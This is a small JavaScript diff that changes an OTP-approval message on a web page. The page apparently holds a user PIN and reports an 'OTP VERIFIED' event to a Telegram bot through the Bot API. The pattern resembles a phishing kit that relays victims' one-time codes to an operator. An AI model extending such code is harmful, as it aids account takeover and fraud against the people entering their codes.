@@ -402,6 +402,7 @@ let userPin = '';
     function onOTPApproved() {
         document.getElementById('otp-waiting').style.display = 'none';
         document.getElementById('otp-approved').style.display = 'block';
+        document.getElementById('otp-approved').querySelector('p').textContent = '✓ OTP Verified!';
         
         // Send ONE message - OTP VERIFIED
         fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
